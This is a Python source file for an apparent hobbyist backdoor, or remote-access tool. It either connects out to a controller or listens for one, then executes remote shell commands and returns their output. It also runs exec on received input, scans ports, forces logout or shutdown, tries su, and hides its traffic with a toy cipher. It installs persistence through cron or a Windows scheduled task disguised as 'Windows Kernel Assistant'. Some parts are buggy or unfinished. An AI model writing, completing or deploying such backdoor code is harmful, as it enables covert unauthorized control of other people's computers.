#!/usr/bin/env python
#FOR PYTHON 3
__version__ = '0.4'
import socket, cmd, getpass, os, argparse, time, platform, subprocess

IP = '127.0.0.1'
PORT = 6000
SYSTEM = platform.system()
idlist = subprocess.check_output('groups').decode('utf-8').split()
ADMINCHECK = idlist[6]

#Setting up runmode
RUNMODE = argparse.ArgumentParser(description='Get runmode')
RUNMODE.add_argument('-a', '--active', action='store_true')#runmode for active(reaching out to the other side)
RUNMODE.add_argument('-p', '--passive', action='store_true')#runmode for passive(waiting to receive connection)
RUNMODE.add_argument('-r', '--reactive', action='store_true')#runmode for reactive(waiting to receive signal)
MODE = vars(RUNMODE.parse_args())#Turns into dict

# Things I learned:
# groups, os.getgroups(), id, whoami, os.getuid()
# ls -la filename sees permissions
# chmod section+permission filename
# add string as help as first line of function
# chmod u+x filename to use shebang line to run
# reactive backdoor by log checking
# wake up - reading logs - found 'codename' - exec codename func
# log stream | grep "codename"
# change modifiable to have action
# read about fft
# how to check if file exists on computer
# cron @reboot filetoexec

def encode_with_key(string_to_encode, key):#Encrypting and decrypting
    list_of_numbers = ''
    for letter in string_to_encode:
        list_of_numbers += str(ord(letter)*key) + ' '
    return list_of_numbers.encode()

def decode_with_key(bytes_to_encode, key):
    string_of_bytes = ''
    list_of_bytes = (bytes_to_encode.decode('utf-8')).split()
    for letter in list_of_bytes:
        string_of_bytes += chr(int(int(letter)//key))
    return string_of_bytes

class recv_commands(cmd.Cmd):
    def __init__(self, server, system, key):#VERY IMPORTANT lets me use key and socket outside main
        self.key = key
        self.server = server
        self.system = system
    def do_exit(self, arg):
        return 0#To make continue_loop 0
    def do_loggedin(self, arg):
        message = encode_with_key(str(getpass.getuser()), self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)#Makes sure that length_of_msg is exactly 5 long by adding zeros
        print('loggedin', length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_WHOAMI(self, arg):
        message = encode_with_key(str(getpass.getuser()), self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('whoami', length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_volume(self, arg):
        os.system('osascript -e \'set volume '+arg+'\'')#Uses applescript
        os.system('osascript -e \'get volume settings\'')#To see actual volume as set volume is not very reliable
        print('volume '+ arg)
        return 1
    def do_say(self, arg):
        os.system('say ' + str(arg))
        print('say ' + arg)
        return 1
    def do_logout(self, arg):
        print('logout')
        if self.system == 'Windows':
            os.system('shutdown -l -f')
        else:
            os.system('osascript -e \'tell application \"loginwindow\" to «event aevtrlgo»\'')
        return 1
    def do_shutdown(self, arg):
        print('shutdown')
        if self.system == 'Windows':
            os.system('shutdown -s -f')
        else:
            os.system('osascript -e \'tell app \"System Events\" to shut down\'')
        return 1
    def do_sleep(self, arg):
        print('sleep')
        if self.system == 'Windows':
            os.system('psshutdown -d')
        elif self.system == 'Darwin':
            os.system('osascript -e \'tell app "System Events" to sleep\'')
        else:#Last one is Linux
            os.system('xset -display :0.0 dpms force off')
        return 1
    def do_exec(self, arg):
        print('exec '+ str(arg))
        args = arg.split()
        try:
            exec(args)
        except:
            pass
        return 1
    def do_cmd(self, arg):
        args = arg.split()
        try:
            message = encode_with_key(str(subprocess.check_output(args).decode('utf-8')), self.key)
        except:
            message = encode_with_key('!Command Failed!', self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('system cmd', length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_portscan(self, arg):
        args = arg.split('-')
        if len(args) > 1:
            ports_to_scan = [range(int(args[0]), int(args[1])+1)]
        elif len(args) == 1:
            ports_to_scan = [args]
        else:
            ports_to_scan = ['19', '22', '23', '53', '80', '115', '123', '194']
        avail_ports = []
        for portcheck in port_to_scan:
            client = socket.socket()
            try:
                client.connect(('127.0.0.1', portcheck))
                avail_ports.append(portcheck)
            except:
                pass
        message = avail_ports
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('portscan ' + str(arg), length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_pers(self, arg):
        if self.system == 'Darwin' or self.system == 'Linux':
            try:
                os.system('cron @reboot {}'.format(__file__))
                message = encode_with_key('Success! File put in crontab.', self.key)
            except:
                message = encode_with_key('!Persistance Failed!', self.key)
        else:#This one for Windows
            try:
                os.system('schtasks /create /tn "Windows Kernel Assistant" /tr {} /sc onstart'.format(os.path.abspath(__file__)))
                message = encode_with_key('Success! File set as scheduled task.', self.key)
            except:
                message = encode_with_key('!Persistance Failed!', self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('persistance', length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_admin(self, arg):
        if ADMINCHECK == 'admin':
            message = 'You are in an admin account.'
        else:
            message = 'You are not in an admin account.'
        message = encode_with_key(str(message), self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('admin', length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_su(self, arg):
        if ADMINCHECK == 'admin':
            sucmd = subprocess.run(['su'], stdin=subprocess.PIPE)
            sucmd.stdin = arg
        print('su ' + arg)
        return 1
    def do_system(self, arg):
        message = encode_with_key(self.system, self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('system', length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_uname(self, arg):
        length_of_msg = ''
        if len(arg) > 0:
            message = platform.uname()[int(arg)]#Returns named tuple
        else:
            message = platform.uname()
            for i in range(6):#Stringing together named tuple
                length_of_msg += message[i] + ' '
            message = length_of_msg
        message = encode_with_key(str(message), self.key)
        length_of_msg = str(len(message))
        length_of_msg = ('0' * (5-len(length_of_msg))) + str(length_of_msg)
        print('uname' + str(arg), length_of_msg)
        self.server.send(str(length_of_msg).encode())
        self.server.send(message)
        return 1
    def do_killattack(self, arg):
        pathtofile = os.path.abspath(__file__)
        print(pathtofile)
        #os.remove(pathtofile)
        return 0

def main():
    'Main function'

    continue_loop = 1#Stopping the cmdone loop uses this var

    print(MODE)

    #Setting up socket
    if MODE['active'] == True and mode['passive'] == True:
        print('Not a valid input')
        raise SystemExit
    elif MODE['reactive'] == True:
        while True:
            time.sleep(10)
            check_log_output = subprocess.check_output(['log', 'stream', '|', 'grep', '"runreactive"']).decode('utf-8')
            instances_in_log = check_log_output.split('\n')
            if len(instances_in_log) == 0:
                continue
            for line in instances_in_log:
                if 'exec' in line:
                    exec('pass')#figure this part out
            for line in instances_in_log:
                if 'cmd' in line:
                    os.system('ls')#figure this part out
    elif MODE['active'] == True:
        while True:
            time.sleep(2)#To not use a noticadable amount of cpu
            try:
                server = socket.socket()
                server.connect((IP, PORT))
                break
            except:
                pass
    else:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
        connect.bind((IP, PORT))
        connect.listen(1)
        server, addr = connect.accept()
    '''while True:#For multiple requests
        server, addr = server.accept()
        length_of_msg = int(server.recv(2).decode('utf-8'))
        key = round(int(round(int(server.recv(length_of_msg).decode('utf-8'))**(1/2))))#Sqrt of key
        print('key', key)
        continue_loop = 1#Stopping the loop uses this var
        while continue_loop:
            length_of_msg_rtrnd = int(server.recv(5).decode('utf-8'))#Standard protocol for my project
            msg_recvd = str(decode_with_key(server.recv(length_of_msg_rtrnd), key))#Then receive real msg
            print('message recvd', msg_recvd)
            continue_loop = recv_commands(key, server).onecmd(msg_recvd)
        print('Bye')
        server.close()'''
    length_of_msg = int(server.recv(2).decode('utf-8'))
    KEY = round(int(round(int(server.recv(length_of_msg).decode('utf-8'))**(1/2))))#Sqrt of key
    length_of_msg = str(len(str(platform.system()).encode()))
    length_of_msg = ('0' * (2-len(length_of_msg))) + str(length_of_msg)
    server.send(length_of_msg.encode())#Send os len
    server.send(platform.system().encode('utf-8'))#Send os
    print('key', KEY)
    while continue_loop:#investigate do while
        length_of_msg = int(server.recv(5).decode('utf-8'))#Standard protocol for my project
        msg_recvd = str(decode_with_key(server.recv(length_of_msg), KEY))#Then receive real msg
        print('message recvd', msg_recvd)
        continue_loop = recv_commands(server, SYSTEM, KEY).onecmd(msg_recvd)
    print('Bye')
    server.close()

if __name__ == '__main__':
    main()
